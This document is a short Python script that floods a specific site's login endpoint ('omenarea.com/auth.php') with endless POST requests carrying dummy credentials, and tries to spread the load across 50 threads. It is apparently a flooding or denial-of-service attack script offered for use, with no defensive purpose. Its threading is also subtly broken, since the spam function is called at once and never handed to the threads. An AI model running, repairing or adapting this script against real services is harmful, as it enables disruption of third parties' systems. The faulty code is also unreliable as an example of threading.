import requests 
import threading

url = "http://omenarea.com/auth.php"

data = {
  "doAuth" : "1",
  "login" : "sdsd",
  "password" : "sdsds",
}

# response = requests.post(url , data = data).text
# if response.ok:
#   print("ok")

# try:
    
#     resp.raise_for_status()
# except requests.exceptions.HTTPError as err:
#     print(err)
def spam (url , data):
  while True:
    resp = requests.post(url ,data)
    print(resp.raise_for_status())

threads = []

for i in range(50):
  x = threading.Thread(target=spam(url , data))
  x.daemon = True
  threads.append(x)

for i in range(50):
  threads[i].start()

for i in range(50):
  threads[i].join()
